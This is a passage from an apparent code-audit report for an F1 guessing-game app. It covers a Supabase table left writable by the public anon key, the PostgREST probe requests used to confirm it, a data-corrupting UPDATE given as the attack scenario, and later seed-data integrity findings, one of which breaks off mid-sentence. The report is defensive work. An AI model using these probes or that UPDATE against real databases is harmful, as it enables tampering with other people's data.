[drizzle/0042](../drizzle/0042_server_authoritative_table_grants.sql) swept, where the absence of a
write policy made the leftover grants inert. Read back from the live catalogue:

```
pg_class.relrowsecurity      drivers = false
role_table_grants            anon, authenticated = SELECT, INSERT, UPDATE, DELETE, TRUNCATE, ...
```

With no RLS, the grant *is* the access. Probed over PostgREST with the public anon key that ships
in the browser bundle — every request either matching zero rows or failing on data, so nothing was
mutated:

```
PATCH  /rest/v1/drivers?id=eq.<n>  -> 204    authorized
DELETE /rest/v1/drivers?id=eq.<n>  -> 204    authorized
POST   /rest/v1/drivers  {}        -> 23502  not-null violation: authorized, only the DATA stopped it
PATCH  /rest/v1/daily_progress     -> 42501  permission denied  (control, post-0042)
```

`UPDATE public.drivers SET career_wins = 0` from any visitor's console needs no FK cooperation and
corrupts every comparison in every mode, including the daily answer's own attributes. Revoked in
0043 on 0042's rule; re-probed after applying, all three now return 42501 and `SELECT` still
returns 206. **SELECT is deliberately left alone** — the pool is public by design (it ships to the
browser for autocomplete) and §3.1 already removed any value in holding it.

**The backfill the finding doesn't mention.** 792 rows exist with no slug, and a migration can't
reach the CSV, so `ON CONFLICT (f1db_id)` would have inserted a *second copy of every driver* —
`NULL` never conflicts. The reconciliation is [scripts/rosterPlan.ts](../scripts/rosterPlan.ts),
pure and unit-tested (13 cases): match by slug; else adopt the single claimable row with the same
`(full_name, date_of_birth)`; else insert. It also re-keys a row whose slug changed upstream rather
than duplicating it, refuses to adopt a row the release still claims by slug, and reports rather
than guesses when either side is ambiguous. Rows the release no longer mentions are **kept and
reported** — deleting them is the original bug. Verified against the real table: **792 adopted, 0
new, 0 unmatched, 0 ambiguous**, and zero `(full_name, date_of_birth)` collisions across the whole
roster.

Three things were added beyond the finding, each because the upsert *changes the failure mode* from
loud to silent:

- **`npm run db:seed -- --dry-run`** performs the entire write and rolls it back. A re-seed no
  longer fails loudly on a foreign key; it rewrites 792 live rows in place. The plan is now the
  thing worth reading, and this is the only way to read it against the real table.
- **A post-upsert row-count invariant** inside the transaction: `existing + planned inserts` must
  equal the actual count, or it rolls back. A missed adoption is otherwise invisible until a
  duplicate driver turns up in autocomplete.
- **A 90% roster floor**, also inside the transaction. Crude on purpose — it catches "most of the
  feed is missing", not the silent per-column failures, which remain **§5.2's** job and are now
  *more* urgent than when they were written, because a bad parse no longer hits a foreign key on
  its way in.

**A pooler gotcha worth keeping.** The adoption `UPDATE` was first written as
`jsonb_to_recordset($1::jsonb)`, then as `unnest($1::int[], $2::text[])`. Both **kill the Supabase
transaction pooler connection** — ~20s hang, then `write CONNECTION_CLOSED` — at 400+ rows, while a
500-row multi-row `INSERT` (5,500 scalar parameters, far more bytes) succeeds in 9.8s. It is the
size of an *individual parameter* that matters, not of the statement. It's a batched `VALUES` list
of scalars now, with the measurement recorded beside it.

**Verified.** Migration dry-run first (every statement inside a rolled-back transaction: column,
constraint, grants read back, multiple NULLs still legal, a duplicate slug rejected, and the whole
file re-applied to prove idempotency), then applied with `npm run db:migrate` and the grants
re-probed live. `npx tsc --noEmit` clean; `npm test` 146 passed; the new
[lib/db/driversRosterIntegrity.test.ts](../lib/db/driversRosterIntegrity.test.ts) 9 passed under
`RUN_DB_INTEGRATION_TESTS=1` — it pins the constraint, the deliberate nullability, the four id
references that make reassignment unsafe, and the revokes from both `anon` **and** `authenticated`
(drizzle/0039's lesson: they are granted separately). A full `--dry-run` seed against production
data completes end to end and rolls back.

**Remaining:** the real `npm run db:seed` has **not** been run — the adoption backfill and the
refreshed wins/teams land on the next real run, which is a production data refresh and the
operator's call. Until then every row's `f1db_id` is NULL, which is a valid, handled state.
**§5.2 is now the priority follow-up**, for the reason given above.

### 5.2 The F1DB release is unpinned — MED
[seed.ts:11-12](../scripts/seed.ts#L11-L12) fetches
`.../releases/latest/download/f1db-csv.zip`. A column rename or file rename upstream turns
into either a thrown "missing expected file" (the good case,
[seed.ts:37-38](../scripts/seed.ts#L37-L38)) or **silently wrong data** (the bad case — e.g. if

Pin a known-good tag in an env var with `latest` as an explicit opt-in, and add a post-parse
sanity assertion (e.g. "expect > 700 drivers and > 25000 results, else abort") *before* the
destructive step.

**The renamed-column failure modes are the dangerous part**, because the three worst ones are
silent:

| Renamed upstream | Result |
|---|---|
| `positionText` | `NON_START_CODES.has(undefined)` → `false` → **every DNQ/DNS counts as a race start**. Debut years shift earlier, `last_active_year` shifts later, pool membership changes, spurious constructors join `previous_teams`. Silent. |
| `positionNumber` | `career_wins` becomes 0 for every driver. Silent. |
| `round` | `Number(undefined)` = `NaN`, so the last-team tie-break never fires → wrong `last_team` for multi-race seasons. Silent. |

A header assertion (`if (!("positionText" in resultRows[0])) throw`) plus a couple of
post-import sanity checks (Hamilton has ≥100 wins; Verstappen's `last_active_year >=
currentYear - 1`) is ~15 lines and converts all three silent modes into loud ones.

### 5.2b Silent slug fallbacks corrupt nationality and team comparison — MED
[seed.ts:138-147](../scripts/seed.ts#L138-L147) falls back to the raw F1DB **slug** on any
lookup miss:

```ts
const nationality = countryNameById.get(row.nationalityCountryId) ?? row.nationalityCountryId;
const lastTeam = agg.lastConstructorId ? (constructorNameById.get(...) ?? agg.lastConstructorId) : null;
```

So a miss stores `"united-states-of-america"` instead of `"United States of America"`. Two
consequences, neither logged nor counted: `countryCode()` returns `null` so the flag silently
vanishes; and because `compare_drivers` compares nationality by **string equality**, a
slug-nationality driver and a name-nationality driver of the *same country* report a
nationality **miss** against each other. Count and log the misses at minimum.

### 5.2c The nationality allow-list tests itself against a copy of itself — MED
[flags.ts:10-51](../lib/game/flags.ts#L10-L51) is a hardcoded 40-entry map, and
[flags.test.ts:9-50](../lib/game/flags.test.ts#L9-L50) asserts every name in a **copy-pasted
duplicate of that same list** maps to a code. It never queries the database, so it can never
detect a new nationality entering the roster — the comment claiming the list was "pulled live
from the DB" describes a one-time manual extraction.

Degradation is graceful (`countryCode` → `null` → `Flag` renders nothing → `GuessRow` falls
back to the plain string), so a *new* nationality is cosmetic. A **renamed** one is worse: it
splits the namespace, since existing rows keep the old string until reseeded while new rows
get the new one, and exact-string comparison then reports a miss between two drivers of the
same country. F1DB has changed country naming before — note `"Russia"` and `"Czechia"` in the
current list.

### 5.2d No unique constraints or check constraints on `drivers` — MED
